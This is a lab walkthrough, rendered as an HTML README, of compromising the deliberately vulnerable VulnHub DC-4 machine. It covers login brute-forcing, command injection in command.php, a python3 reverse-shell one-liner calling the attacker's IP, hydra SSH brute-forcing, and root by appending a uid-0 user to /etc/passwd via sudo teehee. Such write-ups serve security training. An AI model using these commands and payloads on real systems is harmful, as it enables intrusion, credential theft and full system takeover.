@@ -1,0 +1,388 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 10.0.2.30<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_4]<br/>
+└─# nmap -sC -sV 10.0.2.30 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 20:21 +0630<br/>
+Nmap scan report for 10.0.2.30<br/>
+Host is up (0.00016s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 8d6057066c27e02f762ce642c001ba25 (RSA)<br/>
+| &nbsp; 256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)<br/>
+|_ &nbsp;256 fd39478a5e58339973739e227f904f4b (ED25519)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;nginx 1.15.10<br/>
+|_http-title: System Tools<br/>
+|_http-server-header: nginx/1.15.10<br/>
+MAC Address: 08:00:27:75:3E:A5 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+After bruteforcing login with burpsuite, I found login credential for login page<br/>
+<br/>
+username - admin<br/>
+password - happy<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+http://10.0.2.30/command.php<br/>
+<br/>
+I can run command execution with radio buttion that page provide. So, I decided to catch the command request with burpsuite and found out that I can change linux command from that request<br/>
+<br/>
+Request:<br/>
+<br/>
+POST /command.php HTTP/1.1<br/>
+Host: 10.0.2.30<br/>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br/>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>
+Accept-Language: en-US,en;q=0.5<br/>
+Accept-Encoding: gzip, deflate<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-Length: 20<br/>
+Origin: http://10.0.2.30<br/>
+Connection: close<br/>
+Referer: http://10.0.2.30/command.php<br/>
+Cookie: PHPSESSID=2em3gbfb7vfjpem4if4d23rvf6<br/>
+Upgrade-Insecure-Requests: 1<br/>
+<br/>
+radio=pwd&amp;submit=Run<br/>
+<br/>
+Response:<br/>
+<br/>
+HTTP/1.1 200 OK<br/>
+Server: nginx/1.15.10<br/>
+Date: Sun, 19 Feb 2023 14:13:57 GMT<br/>
+Content-Type: text/html; charset=UTF-8<br/>
+Connection: close<br/>
+Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>
+Cache-Control: no-store, no-cache, must-revalidate<br/>
+Pragma: no-cache<br/>
+Content-Length: 749<br/>
+<br/>
+&lt;html&gt;<br/>
+&lt;head&gt;<br/>
+&lt;title&gt;System Tools - Command&lt;/title&gt;<br/>
+&lt;link rel="stylesheet" href="css/styles.css"&gt;<br/>
+&lt;/head&gt;<br/>
+<br/>
+&lt;body&gt;<br/>
+&#09;&lt;div class="container"&gt;<br/>
+&#09;&#09;&lt;div class="inner"&gt;<br/>
+&#09;&#09;<br/>
+&#09;&#09;&#09;You are currently logged in&lt;p&gt;&#09;&#09;<br/>
+&#09;&#09;&#09;&lt;form method="post" action="command.php"&gt;<br/>
+&#09;&#09;&#09;&#09;&lt;strong&gt;Run Command:&lt;/strong&gt;&lt;br&gt;<br/>
+&#09;&#09;&#09;&#09;&lt;input type="radio" name="radio" value="ls -l" checked="checked"&gt;List Files&lt;br /&gt;<br/>
+&#09;&#09;&#09;&#09;&lt;input type="radio" name="radio" value="du -h"&gt;Disk Usage&lt;br /&gt;<br/>
+&#09;&#09;&#09;&#09;&lt;input type="radio" name="radio" value="df -h"&gt;Disk Free&lt;br /&gt;<br/>
+&#09;&#09;&#09;&#09;&lt;p&gt;<br/>
+&#09;&#09;&#09;&#09;&lt;input type="submit" name="submit" value="Run"&gt;<br/>
+&#09;&#09;&#09;&lt;/form&gt;<br/>
+&#09;&#09;&#09;<br/>
+&#09;&#09;&#09;You have selected: pwd&lt;br /&gt;&lt;pre&gt;/usr/share/nginx/html (current directory)<br/>
+&lt;/pre&gt;&lt;p&gt;&lt;a href='login.php'&gt;Return to the menu.&lt;/a&gt;&#09;&#09;&#09;<br/>
+&#09;&#09;&lt;/div&gt;<br/>
+&#09;&lt;/div&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I got reverse shell with python3 reverse shell:<br/>
+<br/>
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
+<br/>
+Request:<br/>
+<br/>
+POST /command.php HTTP/1.1<br/>
+Host: 10.0.2.30<br/>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br/>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>
+Accept-Language: en-US,en;q=0.5<br/>
+Accept-Encoding: gzip, deflate<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-Length: 22<br/>
+Origin: http://10.0.2.30<br/>
+Connection: close<br/>
+Referer: http://10.0.2.30/command.php<br/>
+Cookie: PHPSESSID=7bff7h8js46d0jjvhoftkmnjf5<br/>
+Upgrade-Insecure-Requests: 1<br/>
+<br/>
+radio=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",4444));os.dup2(s.fileno(),0);+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import+pty;+pty.spawn("sh")'&amp;submit=Run<br/>
+<br/>
+Boom! I got reverse shell:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp;<br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.30] 44868<br/>
+$ whoami<br/>
+whoami<br/>
+www-data<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found jim ssh credential from his old-password.bak<br/>
+<br/>
+www-data@dc-4:/home/jim$ cd backups/<br/>
+www-data@dc-4:/home/jim/backups$ ls -la<br/>
+total 12<br/>
+drwxr-xr-x 2 jim jim 4096 Apr &nbsp;7 &nbsp;2019 .<br/>
+drwxr-xr-x 3 jim jim 4096 Apr &nbsp;7 &nbsp;2019 ..<br/>
+-rw-r--r-- 1 jim jim 2047 Apr &nbsp;7 &nbsp;2019 old-passwords.bak<br/>
+www-data@dc-4:/home/jim/backups$ cat old-passwords.bak <br/>
+000000<br/>
+12345<br/>
+iloveyou<br/>
+1q2w3e4r5t<br/>
+<br/>
+I brutefore with hydra and found his password:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_4]<br/>
+└─# hydra -l jim -P passwd.txt 10.0.2.30 ssh<br/>
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br/>
+<br/>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-20 02:17:46<br/>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br/>
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task<br/>
+[DATA] attacking ssh://10.0.2.30:22/<br/>
+[STATUS] 146.00 tries/min, 146 tries in 00:01h, 109 to do in 00:01h, 13 active<br/>
+[STATUS] 105.50 tries/min, 211 tries in 00:02h, 44 to do in 00:01h, 13 active<br/>
+[22][ssh] host: 10.0.2.30 &nbsp; login: jim &nbsp; password: jibril04<br/>
+1 of 1 target successfully completed, 1 valid password found<br/>
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.<br/>
+[ERROR] 3 targets did not resolve or could not be connected<br/>
+[ERROR] 0 target did not complete<br/>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-20 02:19:57<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+ssh login with jim<br/>
+<br/>
+username - jim<br/>
+password - jibril04<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh jim@10.0.2.30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+jim@10.0.2.30's password: <br/>
+Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+You have mail.<br/>
+Last login: Sun Apr &nbsp;7 02:23:55 2019 from 192.168.0.100<br/>
+jim@dc-4:~$ whoami<br/>
+jim<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found Charles's password from jim mail /var/mail/jim<br/>
+<br/>
+jim@dc-4:/var/mail$ cat jim <br/>
+From charles@dc-4 Sat Apr 06 21:15:46 2019<br/>
+Return-path: &lt;charles@dc-4&gt;<br/>
+Envelope-to: jim@dc-4<br/>
+Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br/>
+Received: from charles by dc-4 with local (Exim 4.89)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; (envelope-from &lt;charles@dc-4&gt;)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; id 1hCjIX-0000kO-Qt<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br/>
+To: jim@dc-4<br/>
+Subject: Holidays<br/>
+MIME-Version: 1.0<br/>
+Content-Type: text/plain; charset="UTF-8"<br/>
+Content-Transfer-Encoding: 8bit<br/>
+Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br/>
+From: Charles &lt;charles@dc-4&gt;<br/>
+Date: Sat, 06 Apr 2019 21:15:45 +1000<br/>
+Status: O<br/>
+<br/>
+Hi Jim,<br/>
+<br/>
+I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.<br/>
+<br/>
+Password is: &nbsp;^xHhA&amp;hvim0y<br/>
+<br/>
+See ya,<br/>
+Charles<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I switch to charles with his credential:<br/>
+<br/>
+username - charles<br/>
+password - ^xHhA&amp;hvim0y<br/>
+<br/>
+jim@dc-4:/var/mail$ su charles<br/>
+Password: <br/>
+charles@dc-4:/var/mail$ whoami<br/>
+charles<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation<br/>
+<br/>
+I execute sudo -l and found:<br/>
+<br/>
+charles@dc-4:/var/mail$ sudo -l<br/>
+Matching Defaults entries for charles on dc-4:<br/>
+&nbsp; &nbsp; env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br/>
+<br/>
+User charles may run the following commands on dc-4:<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/teehee<br/>
+<br/>
+/usr/bin/teehee is a same with "tee" binary so I can write everthing I want as root. So, I decided to add new user as root into passwd.<br/>
+<br/>
+Step 1:<br/>
+<br/>
+generate openssl key for password from my kali machine<br/>
+<br/>
+openssl passwd -1 -salt ignite pass123<br/>
+$1$ignite$3eTbJm98O9Hz.k1NTdNxe1<br/>
+<br/>
+Step 2:<br/>
+<br/>
+I copy all the /etc/passwd data into my sublime text:<br/>
+<br/>
+root:x:0:0:root:/root:/bin/bash<br/>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>
+bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>
+sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>
+sync:x:4:65534:sync:/bin:/bin/sync<br/>
+games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br/>
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false<br/>
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false<br/>
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br/>
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false<br/>
+_apt:x:104:65534::/nonexistent:/bin/false<br/>
+messagebus:x:105:109::/var/run/dbus:/bin/false<br/>
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br/>
+nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false<br/>
+charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br/>
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br/>
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash<br/>
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false<br/>
+<br/>
+Step 3:<br/>
+<br/>
+I added new user as root at end of the line<br/>
+<br/>
+lol:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash<br/>
+<br/>
+Final version will look like this<br/>
+<br/>
+root:x:0:0:root:/root:/bin/bash<br/>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>
+bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>
+sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>
+sync:x:4:65534:sync:/bin:/bin/sync<br/>
+games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br/>
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false<br/>
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false<br/>
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br/>
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false<br/>
+_apt:x:104:65534::/nonexistent:/bin/false<br/>
+messagebus:x:105:109::/var/run/dbus:/bin/false<br/>
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br/>
+nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false<br/>
+charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br/>
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br/>
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash<br/>
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false<br/>
+lol:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash<br/>
+<br/>
+Step 4:<br/>
+<br/>
+I copy final version above and create new text file as passwd at victim machine and then paste it into there<br/>
+<br/>
+charles@dc-4:/tmp$ nano passwd<br/>
+<br/>
+Step 5:<br/>
+<br/>
+I read created passwd file with cat and overwrite it into /etc/passwd using sudo /usr/bin/teehee<br/>
+<br/>
+charles@dc-4:/tmp$ cat passwd | sudo /usr/bin/teehee /etc/passwd<br/>
+<br/>
+Step 6:<br/>
+<br/>
+Now, switch into new root user<br/>
+<br/>
+charles@dc-4:/tmp$ su lol<br/>
+Password: <br/>
+root@dc-4:/tmp# whoami<br/>
+root<br/>
+<br/>
+Root Flag (vulnhub flag)<br/>
+<br/>
+root@dc-4:~# cat flag.txt <br/>
+<br/>
+<br/>
+<br/>
+888 &nbsp; &nbsp; &nbsp; 888 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;888 888 &nbsp; &nbsp; &nbsp;8888888b. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 888 888 888 888 <br/>
+888 &nbsp; o &nbsp; 888 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;888 888 &nbsp; &nbsp; &nbsp;888 &nbsp;"Y88b &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;888 888 888 888 <br/>
+888 &nbsp;d8b &nbsp;888 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;888 888 &nbsp; &nbsp; &nbsp;888 &nbsp; &nbsp;888 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;888 888 888 888 <br/>
+888 d888b 888 &nbsp;.d88b. &nbsp;888 888 &nbsp; &nbsp; &nbsp;888 &nbsp; &nbsp;888 &nbsp;.d88b. &nbsp;88888b. &nbsp; .d88b. &nbsp;888 888 888 888 <br/>
+888d88888b888 d8P &nbsp;Y8b 888 888 &nbsp; &nbsp; &nbsp;888 &nbsp; &nbsp;888 d88""88b 888 "88b d8P &nbsp;Y8b 888 888 888 888 <br/>
+88888P Y88888 88888888 888 888 &nbsp; &nbsp; &nbsp;888 &nbsp; &nbsp;888 888 &nbsp;888 888 &nbsp;888 88888888 Y8P Y8P Y8P Y8P <br/>
+8888P &nbsp; Y8888 Y8b. &nbsp; &nbsp; 888 888 &nbsp; &nbsp; &nbsp;888 &nbsp;.d88P Y88..88P 888 &nbsp;888 Y8b. &nbsp; &nbsp; &nbsp;" &nbsp; " &nbsp; " &nbsp; " &nbsp;<br/>
+888P &nbsp; &nbsp; Y888 &nbsp;"Y8888 &nbsp;888 888 &nbsp; &nbsp; &nbsp;8888888P" &nbsp; "Y88P" &nbsp;888 &nbsp;888 &nbsp;"Y8888 &nbsp;888 888 888 888 <br/>
+<br/>
+<br/>
+Congratulations!!!<br/>
+<br/>
+Hope you enjoyed DC-4. &nbsp;Just wanted to send a big thanks out there to all those<br/>
+who have provided feedback, and who have taken time to complete these little<br/>
+challenges.<br/>
+<br/>
+If you enjoyed this CTF, send me a tweet via @DCAU7.<br/>
+<br/>
+<br/>
+charles@dc-4:/home/jim$ cat local.txt (offensive security playground lab flag) <br/>
+181e790c9bf4f6d72545d9529f9aa781<br/>
+<br/>
+root@dc-4:~# cat proof.txt (offensive security playground lab flag) <br/>
+b7d7985b6ee8b963248d1a97afb9ad08</body></html>
